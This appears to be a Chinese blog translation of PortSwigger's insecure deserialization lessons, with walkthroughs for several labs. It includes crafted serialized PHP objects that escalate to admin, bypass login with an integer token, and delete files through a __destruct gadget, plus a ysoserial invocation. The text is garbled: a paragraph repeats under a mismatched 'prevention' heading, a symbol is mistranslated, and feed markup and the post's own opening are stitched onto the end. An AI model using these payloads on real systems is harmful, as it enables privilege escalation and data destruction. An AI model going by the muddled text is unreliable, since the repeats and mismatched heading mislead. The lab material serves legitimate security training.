<p>我们还将指导您创建自己的基于反序列化的高严重性攻击。虽然这些攻击通常需要源代码访问权限，但一旦理解了基本概念，学习起来也会比想象中容易。我们将特别介绍以下主题：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>如何识别不安全的反序列化 LABS</p>
</li>
<li class="lvl-2">
<p>修改网站期望的序列化对象 LABS</p>
</li>
<li class="lvl-2">
<p>向危险的网站功能传递恶意数据 LABS</p>
</li>
<li class="lvl-2">
<p>注入任意对象类型</p>
</li>
<li class="lvl-2">
<p>串联方法调用以控制进入危险水槽小工具的数据流 LABS</p>
</li>
<li class="lvl-2">
<p>手动创建自己的高级漏洞利用程序 LABS</p>
</li>
<li class="lvl-2">
<p>PHAR 反序列化</p>
</li>
</ul>
<blockquote>
<p><strong>Note</strong></p>
<p>尽管许多实验和示例都基于 PHP，但大多数开发技术对其他语言也同样适用。</p>
</blockquote>
<h3 id="如何识别不安全的反序列化">如何识别不安全的反序列化</h3>
<p>不管是白盒测试还是黑盒测试，识别不安全的反序列化都相对简单。</p>
<p>在审计过程中，你应该查看所有传入网站的数据，并尝试识别任何看起来像序列化数据的东西。如果了解不同语言使用的格式，序列化数据就能比较容易地识别出来。在本节中，我们将展示 PHP 和 Java 序列化的示例。一旦识别出序列化数据，就可以测试是否能够控制它。</p>
<blockquote>
<p><strong>Tip</strong></p>
<p>对于 Burp Suite Professional 的用户，Burp Scanner 会自动标记任何看起来包含序列化对象的 HTTP 消息。</p>
</blockquote>
<h3 id="PHP-序列化格式">PHP 序列化格式</h3>
<p>PHP 使用的大多是人类可读的字符串格式，字母代表数据类型，数字代表每个条目的长度。例如，用户对象的属性为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;name = <span class="string">&quot;carlos&quot;</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;isLoggedIn = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>序列化后，该对象的外观可能如下所示：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>:s:<span class="number">6</span>:<span class="string">&quot;carlos&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;isLoggedIn&quot;</span>:b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>这可以解释为：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>O:4: &quot;User&quot;</code> - 具有 4 个字符类名 <code>&quot;User&quot;</code> 的对象</p>
</li>
<li class="lvl-2">
<p><code>2</code> - 该对象有 2 个属性</p>
</li>
<li class="lvl-2">
<p><code>s:4: &quot;name&quot;</code> - 第一个属性的键是 4 个字符的字符串 <code>“name”</code>。</p>
</li>
<li class="lvl-2">
<p><code>s:6: &quot;carlos&quot;</code> - 第一个属性的值是 6 个字符的字符串 <code>“carlos”</code>。</p>
</li>
<li class="lvl-2">
<p><code>s:10: &quot;isLoggedIn&quot;</code> - 第二个属性的键是 10 个字符的字符串 “isLoggedIn”。</p>
</li>
<li class="lvl-2">
<p><code>b:1</code> - 第二个属性的值是布尔值 <code>true</code></p>
</li>
</ul>
<p>PHP 序列化的本地方法是 <code>serialize() </code>和 <code>unserialize()</code>。如果可以访问源代码，就应该先在代码中查找 <code>unserialize()</code>，然后进一步研究。</p>
<h3 id="Java-序列化格式">Java 序列化格式</h3>
<p>有些语言（如 Java）使用二进制序列化格式。这种格式更难读取，但如果知道如何识别一些蛛丝马迹，还是可以识别序列化数据的。例如，序列化的 Java 对象总是以相同的字节开始，在十六进制中编码为 <code>aced</code>，在 Base64 中编码为 <code>rO0</code>。</p>
<p>任何实现了 <code>java.io.Serializable</code> 接口的类都可以被序列化和反序列化。如果您可以访问源代码，请注意任何使用 <code>readObject()</code> 方法的代码，该方法用于从 <code>InputStream</code> 中读取和反序列化数据。</p>
<h3 id="操作序列化对象">操作序列化对象</h3>
<p>利用某些反序列化漏洞就像更改序列化对象中的一个属性一样简单。由于对象状态是持久化的，因此可以通过研究序列化数据来识别和编辑有趣的属性值。然后，您就可以通过网站的反序列化过程将恶意对象传入网站。这是基本反序列化漏洞利用的第一步。</p>
<p>一般来说，在操作序列化对象时有两种方法。一种是直接编辑字节流形式的对象，另一种是用相应的语言编写简短的脚本，自己创建新对象并将其序列化。在处理二进制序列化格式时，后一种方法通常更为简便。</p>
<h4 id="修改对象属性">修改对象属性</h4>
<p>在篡改数据时，只要攻击者保留了一个有效的序列化对象，反序列化过程就会创建一个带有修改后属性值的服务器端对象。</p>
<p>举个简单的例子，一个网站使用序列化的 <code>User</code> 对象在 cookie 中存储用户会话数据。如果攻击者在 HTTP 请求中发现了这个序列化对象，他们可能会对其进行解码，发现以下字节流：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;carlos&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;isAdmin&quot;</span>;b:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><code>isAdmin</code> 属性是一个明显的关注点。攻击者只需将该属性的布尔值改为 <code>1</code>（true），重新编码对象，然后用修改后的值覆盖当前 cookie 即可。单独来看，这不会产生任何影响。但是，假设网站使用此 cookie 来检查当前用户是否有访问某些管理功能的权限：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>-&gt;isAdmin === <span class="literal">true</span>) &#123;</span><br><span class="line"><span class="comment">// allow access to admin interface</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段有漏洞的代码会根据 cookie 中的数据（包括攻击者修改过的 <code>isAdmin</code> 属性）实例化一个<code>User</code>对象。在任何时候都不会检查序列化对象的真实性。然后，这些数据会被传递到条件语句中，在这种情况下，就可以轻松实现权限升级。</p>
<p>这种简单的情况在实际应用中并不常见。不过，以这种方式编辑属性值，展示了获取不安全反序列化所暴露的大量攻击面的第一步。</p>
<h4 id="Lab：修改序列化对象">Lab：修改序列化对象</h4>
<p>本实验使用了基于序列化的会话机制，因此存在权限升级漏洞。要解决该实验问题，请编辑会话 cookie 中的序列化对象，利用此漏洞获得管理权限。然后删除用户 carlos。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用自己的凭据登录。请注意，登录后的 <code>GET /my-account</code> 请求包含一个会话 cookie，它似乎是 URL 和 Base64 编码的。</p>
</li>
<li class="lvl-2">
<p>使用 Burp 的 Inspector 面板研究请求的解码形式。请注意，cookie 实际上是一个序列化的 PHP 对象。admin 属性包含 b:0，表示布尔值 false。将此请求发送到 Burp Repeater。</p>
</li>
<li class="lvl-2">
<p>在 Burp Repeater 中，使用检查器再次检查 cookie，并将 admin 属性的值更改为 b:1。点击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p>
</li>
<li class="lvl-2">
<p>发送请求。请注意，响应中现在包含了一个指向 /admin 管理面板的链接，表明您已使用管理员权限访问了该页面。</p>
</li>
<li class="lvl-2">
<p>将请求路径改为 /admin，然后重新发送。注意 /admin 页面包含删除特定用户账户的链接。</p>
</li>
<li class="lvl-2">
<p>将请求路径更改为 /admin/delete?username=carlos，然后发送请求以解决实验室问题。</p>
</li>
</ul>
<h4 id="修改数据类型">修改数据类型</h4>
<p>我们已经看到了如何修改序列化对象中的属性值，但也有可能提供意想不到的数据类型。</p>
<p>由于在比较不同数据类型时使用了松散比较运算符 (==)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 5 == “5” 的值为 true。</p>
<h2 id="如何防止不安全的反序列化漏洞">如何防止不安全的反序列化漏洞</h2>
<p>一般来说，除非绝对必要，否则应避免对用户输入进行反序列化。在许多情况下，反序列化可能带来的高严重性漏洞，以及防范这些漏洞的难度，都超过了反序列化的好处。</p>
<p>由于在比较不同数据类型时使用了松散比较运算符 (==)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 5 == “5” 的值为 true。</p>
<p>由于在比较不同数据类型时使用了松散比较运算符 (<code>==</code>)，基于 PHP 的逻辑特别容易受到这种操作的影响。例如，如果在整数和字符串之间进行松散比较，PHP 会尝试将字符串转换为整数，这意味着 <code>5 == “5”</code> 的值为 <code>true</code>。</p>
<p>不同寻常的是，这也适用于任何以数字开头的字母数字字符串。在这种情况下，PHP 将根据开头的数字有效地将整个字符串转换为整数值。字符串的其余部分将被完全忽略。因此，<code>5 == &quot;5 of something&quot;</code> 实际上被视为 <code>5 == 5</code>。</p>
<p>同样，在 PHP 7.x 及更早版本中，比较 <code>0 == &quot;Example string&quot;</code> 的结果为 <code>true</code>，因为 PHP 将整个字符串视为整数 <code>0</code>。</p>
<p>考虑将这种松散的比较运算符与来自反序列化对象的用户可控数据结合使用的情况。这有可能导致危险的逻辑缺陷。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$login</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line"><span class="comment">// log in successfully</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>假设攻击者修改了密码属性，使其包含整数 <code>0</code>，而不是预期的字符串。只要存储的密码不是以数字开头，该条件就会始终返回 <code>true</code>，从而实现身份验证绕过。请注意，这只是因为反序列化保留了数据类型。如果代码直接从请求中获取密码，<code>0</code> 将被转换为字符串，条件将返回 <code>false</code>。</p>
<blockquote>
<p><strong>Note</strong></p>
<p>在 PHP 8 及以后的版本中，0 == “Example string ”比较结果为 false，因为在比较过程中字符串不再隐式转换为 0。因此，在这些版本的 PHP 中无法使用此漏洞。</p>
<p>比较以数字开头的字母数字字符串的行为在 PHP 8 中保持不变。因此，5 == <code>“5 of something ”</code>仍被视为 <code>5 == 5</code>。</p>
</blockquote>
<p>请注意，在修改任何序列化对象格式中的数据类型时，一定要记得更新序列化数据中的任何类型标签和长度指示符。否则，序列化对象将被损坏，无法进行反序列化。</p>
<h4 id="Lab：-修改序列化数据类型">Lab： 修改序列化数据类型</h4>
<p>本实验使用了基于序列化的会话机制，因此容易发生身份验证绕过。要解决该实验问题，请编辑会话 cookie 中的序列化对象，以访问<code>administrator</code>账户。然后删除用户 <code>carlos</code>。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>使用自己的凭据登录。在 Burp 中，打开登录后的 <code>GET /my-account</code> 请求，并使用检查器检查会话 cookie，以显示序列化的 PHP 对象。将此请求发送到 Burp Repeater。</p>
</li>
<li class="lvl-2">
<p>在 Burp Repeater 中，使用检查器面板对会话 cookie 进行如下修改：</p>
<ul class="lvl-2">
<li class="lvl-4">
<p>将用户名属性的长度更新为 13。</p>
</li>
<li class="lvl-4">
<p>将用户名改为管理员。</p>
</li>
<li class="lvl-4">
<p>将访问令牌更改为整数 0。 由于这不再是字符串，因此还需要删除值周围的双引号。</p>
</li>
<li class="lvl-4">
<p>将 s 替换为 i，更新访问令牌的数据类型标签。</p>
</li>
</ul>
</li>
</ul>
<p>结果应该是这样的:</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;administrator&quot;</span>;s:<span class="number">12</span>:<span class="string">&quot;access_token&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>单击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p>
</li>
<li class="lvl-2">
<p>发送请求。请注意，响应中现在包含一个指向 <code>/admin</code> 管理面板的链接，表明您已成功以管理员用户身份访问该页面。</p>
</li>
<li class="lvl-2">
<p>将请求路径改为 <code>/admin</code>，然后重新发送。注意<code> /admin</code> 页面包含删除特定用户账户的链接。</p>
</li>
<li class="lvl-2">
<p>将请求路径更改为<code> /admin/delete?username=carlos</code>，然后发送请求以解决实验室问题。</p>
</li>
</ul>
<p>在直接处理二进制格式时，我们建议使用 BApp 商店提供的 Hackvertor 扩展。使用 Hackvertor，你可以将序列化数据修改为字符串，它会自动更新二进制数据，并相应调整偏移量。这样可以节省大量的手动操作。</p>
<h2 id="使用应用程序功能">使用应用程序功能</h2>
<p>除了简单地检查属性值外，网站功能还可能对来自反序列化对象的数据执行危险操作。在这种情况下，您可以利用不安全的反序列化传递非预期数据，并利用相关功能进行破坏。</p>
<p>例如，作为网站 “删除用户 ”功能的一部分，用户的个人资料图片是通过访问 <code>$user-&gt;image_location</code> 属性中的文件路径来删除的。如果该 <code>$user</code> 是通过序列化对象创建的，攻击者就可以通过将 <code>image_location</code> 设置为任意文件路径的修改后传入来利用这一漏洞。删除自己的用户账户后，也会删除这个任意文件。</p>
<h4 id="Lab：-使用应用程序功能利用不安全的反序列化">Lab： 使用应用程序功能利用不安全的反序列化</h4>
<p>本实验室使用基于序列化的会话机制。某个功能会对序列化对象中提供的数据调用一个危险的方法。要解决这个实验问题，请编辑会话 cookie 中的序列化对象，并用它删除<code>Carlos</code>主目录中的 <code>morale.txt</code> 文件。</p>
<ol>
<li class="lvl-3">
<p>登录自己的账户。在 “我的账户 ”页面，注意到有删除账户的选项，可向 /my-account/delete 发送 POST 请求。</p>
</li>
<li class="lvl-3">
<p>向 Burp Repeater 发送包含会话 cookie 的请求。</p>
</li>
<li class="lvl-3">
<p>在 Burp Repeater 中，使用检查器面板研究会话 cookie。注意到序列化对象有一个 avatar_link 属性，其中包含头像的文件路径。</p>
</li>
<li class="lvl-3">
<p>编辑序列化数据，使 avatar_link 指向 /home/carlos/morale.txt。记住要更新长度指示符。修改后的属性应如下所示：</p>
</li>
</ol>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">s</span>:<span class="number">11</span>:<span class="string">&quot;avatar_link&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;/home/carlos/morale.txt&quot;</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li class="lvl-3">
<p>点击 “应用更改”。修改后的对象将自动重新编码并更新到请求中。</p>
</li>
<li class="lvl-3">
<p>将请求行改为 POST /my-account/delete 并发送请求。您的账户将被删除，同时删除的还有卡洛斯的 morale.txt 文件。</p>
</li>
</ol>
<p>这个示例依赖于攻击者通过用户可访问的功能手动调用危险方法。但是，如果利用漏洞自动将数据传递到危险方法中，不安全的反序列化就会变得更加有趣。使用 “magic methods ”可以实现这一点。</p>
<h2 id="Magic-methods">Magic methods</h2>
<p>魔法方法是无需显式调用的方法的特殊子集。相反，每当发生特定事件或情况时，它们就会被自动调用。魔法方法是各种语言中面向对象编程的常见特征。有时会在方法名称的前缀或周围加上双引号来表示它们。</p>
<p>开发人员可以在类中添加魔法方法，以便预先确定在相应事件或场景发生时应执行哪些代码。调用魔法方法的具体时间和原因因方法而异。PHP 中最常见的例子之一是 <code>__construct()</code>，它在类的对象实例化时被调用，类似于 Python 的 <code>__init__</code> 。通常，构造函数魔法方法包含初始化实例属性的代码。不过，开发人员可以自定义魔法方法，以执行他们想要的任何代码。</p>
<p>魔法方法被广泛使用，其本身并不代表漏洞。但是，当执行这些方法的代码处理攻击者可控制的数据（例如来自反序列化对象的数据）时，它们就会变得危险。攻击者可以利用这一点，在满足相应条件时自动调用反序列化数据上的方法。</p>
<p>最重要的是，有些语言在反序列化过程中会自动调用魔法方法。例如，PHP 的 <code>unserialize()</code> 方法会查找并调用对象的 <code>__wakeup()</code> 魔法方法。</p>
<p>在 Java 反序列化中，<code>ObjectInputStream.readObject()</code> 方法也是如此，该方法用于从初始字节流中读取数据，本质上类似于 “重新初始化 ”序列化对象的构造函数。不过，可序列化类也可以按如下方式声明自己的 <code>readObject()</code> 方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// implementation</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以这种方式声明的 <code>readObject()</code> 方法就像一个魔法方法，在反序列化过程中会被调用。这样，类就能更紧密地控制自己字段的反序列化。</p>
<p>你应该密切关注任何包含这类神奇方法的类。它们允许你在对象完全反序列化之前将数据从序列化对象传递到网站代码中。这是创建更高级漏洞的起点。</p>
<h2 id="注入任意对象">注入任意对象</h2>
<p>正如我们所见，偶尔可以通过简单编辑网站提供的对象来利用不安全的反序列化。然而，注入任意对象类型会带来更多可能性。</p>
<p>在面向对象编程中，对象可用的方法由其类决定。因此，如果攻击者能操纵作为序列化数据传入的对象类别，就能影响反序列化后甚至反序列化过程中执行的代码。</p>
<p>反序列化方法通常不会检查它们正在反序列化的对象。这意味着你可以传入网站可用的任何可序列化类的对象，而该对象将被反序列化。这实际上允许攻击者创建任意类的实例。这个对象不是预期的类并不重要。意外的对象类型可能会导致应用程序逻辑出现异常，但恶意对象届时已经实例化了。</p>
<p>如果攻击者可以访问源代码，他们就可以详细研究所有可用的类。要构建一个简单的漏洞，攻击者可以查找包含反序列化魔法方法的类，然后检查其中是否有对可控数据执行危险操作的类。然后，攻击者就可以传入该类的序列化对象，使用其魔法方法进行攻击。</p>
<h4 id="Lab：-PHP-中的任意对象注入">Lab： PHP 中的任意对象注入</h4>
<p>本实验使用基于序列化的会话机制，因此容易受到任意对象注入的攻击。要解决该实验问题，请创建并注入一个恶意序列化对象，以删除 Carlos home 目录中的 morale.txt 文件。您需要获得源代码访问权限才能解决本实验。</p>
<ol>
<li class="lvl-3">
<p>登录自己的账户，注意会话 cookie 包含一个序列化的 PHP 对象。</p>
</li>
<li class="lvl-3">
<p>在网站地图中，注意到网站引用了 <code>/libs/CustomTemplate.php</code> 文件。右键单击该文件，选择 “发送到中继器”。</p>
</li>
</ol>
<p><img src="/posts/bea7d250//image-20250527163121200.png" alt="image-20250527163121200"></p>
<ol start="3">
<li class="lvl-3">
<p>在 Burp Repeater 中，注意在请求行的文件名后添加一个斜杠 (<code>~</code>) 就能读取源代码。</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomTemplate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template_file_path</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lock_file_path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$template_file_path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;template_file_path = <span class="variable">$template_file_path</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lock_file_path = <span class="variable">$template_file_path</span> . <span class="string">&quot;.lock&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">isTemplateLocked</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;lock_file_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTemplate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;template_file_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveTemplate</span>(<span class="params"><span class="variable">$template</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">isTemplateLocked</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;lock_file_path, <span class="string">&quot;&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Could not write to &quot;</span> . <span class="variable language_">$this</span>-&gt;lock_file_path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;template_file_path, <span class="variable">$template</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Could not write to &quot;</span> . <span class="variable language_">$this</span>-&gt;template_file_path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Carlos thought this would be a good idea</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;lock_file_path)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;lock_file_path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="4">
<li class="lvl-3">
<p>在源代码中，请注意 <code>CustomTemplate</code> 类包含 <code>__destruct()</code> 魔法方法。这将调用 <code>lock_file_path</code> 属性上的 <code>unlink()</code> 方法，从而删除该路径上的文件。</p>
</li>
<li class="lvl-3">
<p>在 Burp 解码器中，使用序列化 PHP 数据的正确语法创建一个 <code>CustomTemplate</code> 对象，并将 <code>lock_file_path</code> 属性设置为 <code>/home/carlos/morale.txt</code>。确保使用正确的数据类型标签和长度指示符。最终对象应如下所示：</p>
</li>
</ol>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">14</span>:<span class="string">&quot;CustomTemplate&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;lock_file_path&quot;</span>;s:<span class="number">23</span>:<span class="string">&quot;/home/carlos/morale.txt&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<ol start="6">
<li class="lvl-3">
<p>对该对象进行 Base64 和 URL 编码，并将其保存到剪贴板。</p>
</li>
<li class="lvl-3">
<p>向 Burp Repeater 发送包含会话 cookie 的请求。</p>
</li>
<li class="lvl-3">
<p>在 Burp Repeater 中，用剪贴板中修改后的 cookie 替换会话 cookie。</p>
</li>
<li class="lvl-3">
<p>发送请求。魔法方法 <code>__destruct()</code> 会被自动调用，并删除 Carlos 的文件。</p>
</li>
</ol>
<p>包含这些反序列化魔法方法的类还可用于发起更复杂的攻击，其中涉及一长串方法调用，即所谓的 “小工具链”。</p>
<h2 id="小工具链">小工具链</h2>
<p>小工具 &quot;是应用程序中存在的代码片段，可帮助攻击者实现特定目标。单个小工具可能不会直接对用户输入进行任何有害操作。但是，攻击者的目标可能只是调用一个方法，将用户输入传递到另一个小工具中。通过以这种方式将多个小工具串联在一起，攻击者就有可能将其输入传递到一个危险的 “下沉小工具 ”中，从而造成最大的破坏。</p>
<p>重要的是要明白，与其他一些类型的漏洞利用不同，小工具链不是攻击者构建的链式方法的有效payload。所有代码都已存在于网站上。攻击者唯一能控制的是传入小工具链的数据。这通常是通过在反序列化过程中调用的魔法方法来实现的，有时也称为 “启动小工具”。</p>
<p>在外网，许多不安全的反序列化漏洞只能通过使用小工具链来利用。这有时可能是简单的一步或两步链，但构建高严重性攻击可能需要更复杂的对象实例化和方法调用序列。因此，能够构建小工具链是成功利用不安全反序列化的关键因素之一。</p>
<h3 id="使用预制小工具链">使用预制小工具链</h3>
<p>手动识别小工具链可能是一个相当艰巨的过程，而且在没有源代码访问权限的情况下几乎是不可能的。幸运的是，有几种使用预建小工具链的方法可以先试试。</p>
<p>有几种工具可以提供一系列预先发现的链，这些链已在其他网站上被成功利用。即使您没有访问源代码的权限，也可以使用这些工具来识别和利用不安全的反序列化漏洞，所需的工作量相对较小。之所以能采用这种方法，是因为广泛使用了包含可利用小工具链的库。例如，如果 Java 的 Apache Commons Collections 库中的小工具链可以在一个网站上被利用，那么任何其他实现该库的网站也可以使用相同的小工具链进行利用。</p>
<h4 id="ysoserial">ysoserial</h4>
<p>ysoserial &quot;就是这样一个 Java 反序列化工具。它可以让你从提供的小工具链中选择一个你认为目标应用程序正在使用的库，然后传入你想执行的命令。然后，它会根据所选链创建一个合适的序列化对象。这仍然需要一定的尝试和错误，但比手动构建自己的小工具链要省力得多。</p>
<blockquote>
<p><strong>Note</strong><br>
在 Java 16 及以上版本中，您需要设置一系列命令行参数，以便 Java 运行 ysoserial。例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar \</span><br><span class="line">   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.base/java.net=ALL-UNNAMED \</span><br><span class="line">   --add-opens=java.base/java.util=ALL-UNNAMED \</span><br><span class="line">   [payload] <span class="string">&#x27;[command]&#x27;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="Lab：使用Apache-Commons利用Java-反序列化">Lab：使用Apache Commons利用Java 反序列化</h4>
<p>本实验室使用基于序列化的会话机制，并加载 Apache Commons Collections 库。虽然您没有源代码访问权限，但仍可使用预构建的小工具链来利用本实验室。</p>
<p>要解决该实验室问题，请使用第三方工具生成一个包含远程代码执行有效载荷的恶意序列化对象。然后，将此对象传入网站，删除卡洛斯主目录中的 <code>morale.txt</code> 文件。</p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>靶场</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>【PortSwigger靶场】反序列化</title>
    <url>/posts/bea7d250/</url>
    <content><![CDATA[<h2 id="不安全的反序列化">不安全的反序列化</h2>
<p>在本节中，我们将介绍什么是不安全的反序列化，并描述不安全的反序列化如何可能使网站遭受严重攻击。我们将重点介绍典型场景，并使用 PHP、Ruby 和 Java 反序列化的具体示例演示一些广泛适用的技术。我们还将介绍一些可以避免自己的网站出现不安全反序列化漏洞的方法。</p>
<h2 id="什么是序列化？">什么是序列化？</h2>
<p>序列化是将复杂的数据结构（如对象及其字段）转换为 “flatter” 格式的过程，这种格式可以作为连续的字节流发送和接收。数据序列化使以下工作变得更加简单：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>将复杂数据写入进程间内存、文件或数据库</p>
</li>
<li class="lvl-2">
<p>通过网络、应用程序不同组件之间或 API 调用等方式发送复杂数据</p>
</li>
</ul>
<p>最重要的是，在序列化对象时，其状态也会被持久化。换句话说，对象的属性及其赋值都会被保留下来。</p>
<h3 id="序列化与反序列化">序列化与反序列化</h3>
<p>反序列化是将字节流还原为原始对象的全功能复制品的过程，其状态与序列化时完全相同。然后，网站的逻辑就可以与这个反序列化对象交互，就像与其他对象交互一样。</p>
<p>许多编程语言都为序列化提供本地支持。具体如何序列化对象取决于语言。有些语言将对象序列化为二进制格式，而其他语言则使用不同的字符串格式，其可读性也各不相同。请注意，原始对象的所有属性都会存储在序列化数据流中，包括任何私有字段。要防止某个字段被序列化，必须在类声明中将其明确标记为 “transient” 字段。</p>
<p>请注意，在使用不同的编程语言时，序列化可能被称为 marshalling（Ruby）或 pickling（Python）。这些术语在此处与 “serialization” 同义。</p>
<h2 id="什么是不安全的反序列化？">什么是不安全的反序列化？</h2>
<p>不安全的反序列化是指网站对用户可控数据进行反序列化。这有可能使攻击者操纵序列化对象，从而将有害数据传递到应用程序代码中。</p>
<p>甚至有可能将序列化后的对象替换为完全不同类的对象。令人担忧的是，网站可用的任何类的对象都会被反序列化和实例化，而不管预期的是哪个类。因此，不安全的反序列化有时被称为 “对象注入 ”漏洞。</p>
<p>一个意外类的对象可能会导致异常。不过，此时破坏可能已经造成。许多基于反序列化的攻击都是在反序列化完成之前完成的。这意味着，即使网站本身的功能不直接与恶意对象交互，反序列化过程本身也可能发起攻击。因此，逻辑基于强类型语言的网站也容易受到这些技术的攻击。</p>
<h2 id="不安全的反序列化漏洞是如何产生的？">不安全的反序列化漏洞是如何产生的？</h2>
<p>不安全的反序列化通常是因为人们普遍缺乏对反序列化用户可控数据的危险性的认识。理想情况下，用户输入根本不应该被反序列化。</p>
